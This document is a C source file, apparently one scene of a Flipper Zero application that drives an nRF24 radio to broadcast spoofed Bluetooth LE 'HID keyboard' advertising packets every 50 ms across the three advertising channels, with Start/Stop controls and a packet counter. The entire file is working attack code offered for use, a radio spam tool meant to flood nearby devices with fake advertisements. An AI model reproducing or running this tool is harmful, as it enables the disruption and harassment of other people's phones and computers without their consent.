#include "../zx_ble_spam.h"
#include "../nrf24.h"
#include "scenes.h"
#include <furi.h>
#include <stdio.h>
#include <string.h>

static FuriTimer* timer = NULL;
static uint16_t kb_count = 0;

static const uint8_t ble_keyboard[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x0C, 0x18,
    0x0F, 0x16, 0x0C, 0x18, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
#define KEYBOARD_PKT_LEN 31

static void timer_callback(void* context) {
    App* app = context;
    static uint8_t ch = 37;
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;

    nrf24_set_channel(ch);
    nrf24_set_mode(NRF24ModeTx);
    nrf24_set_ble_adv_mode(true);

    nrf24_send_packet((uint8_t*)ble_keyboard, KEYBOARD_PKT_LEN, 20);
    nrf24_set_mode(NRF24ModeRx);

    kb_count++;
    if(kb_count % 20 == 0) {
        app_add_log(app, "KB spam: %d pkt", kb_count);
        view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventUpdateDisplay);
    }
}

static void button_callback(GuiButtonType type, InputType input_type, void* context) {
    (void)type; (void)input_type;
    App* app = context;
    if(timer) {
        furi_timer_free(timer); timer = NULL;
        nrf24_set_ble_adv_mode(false);
    } else {
        kb_count = 0;
        nrf24_set_ble_adv_mode(true);
        app->log_text[0] = '\0'; app->log_len = 0;
        app_add_log(app, "BLE KB spam started");
        timer = furi_timer_alloc(timer_callback, FuriTimerTypePeriodic, app);
        furi_timer_start(timer, 50);
    }
    view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventToggleScan);
}

void zx_ble_spam_scene_keyboard_spam_on_enter(void* context) {
    App* app = context;
    widget_reset(app->widget);
    if(!app->nrf24_connected) {
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignCenter, FontSecondary, "nRF24 not connected");
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
        return;
    }
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Keyboard Spam");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignCenter, FontSecondary, "Spoofs advertising");
    widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignCenter, FontSecondary, "HID keyboard");
    widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
}

bool zx_ble_spam_scene_keyboard_spam_on_event(void* context, SceneManagerEvent event) {
    App* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == BLEEventUpdateDisplay) {
        text_box_set_text(app->text_box, app->log_text);
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewTextBox);
        return true;
    }
    if(event.type == SceneManagerEventTypeCustom && event.event == BLEEventToggleScan) {
        if(timer) {
            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Keyboard Spam");
            widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignCenter, FontSecondary, "Spamming");
            widget_add_button_element(app->widget, GuiButtonTypeCenter, "Stop", button_callback, app);
        } else {
            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary, "Keyboard Spam");
            widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
        }
        view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
        return true;
    }
    return false;
}

void zx_ble_spam_scene_keyboard_spam_on_exit(void* context) {
    if(timer) { furi_timer_free(timer); timer = NULL; }
    App* app = context;
    nrf24_set_ble_adv_mode(false);
    text_box_set_text(app->text_box, "");
    widget_reset(app->widget);
}
